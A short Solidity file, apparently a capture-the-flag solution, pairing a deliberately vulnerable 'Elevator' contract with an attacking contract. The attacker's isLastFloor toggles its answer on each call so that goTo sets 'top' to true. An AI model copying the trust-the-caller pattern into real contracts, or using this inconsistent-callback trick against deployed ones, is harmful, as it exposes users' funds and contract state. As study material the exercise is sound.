// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract Build is Building {
    bool public _bool = true;

    function isLastFloor(uint256) external returns (bool) {
        _bool = !_bool;
        return _bool;
    }

    function attack(Elevator addr) public {
        addr.goTo(12);
    }
}
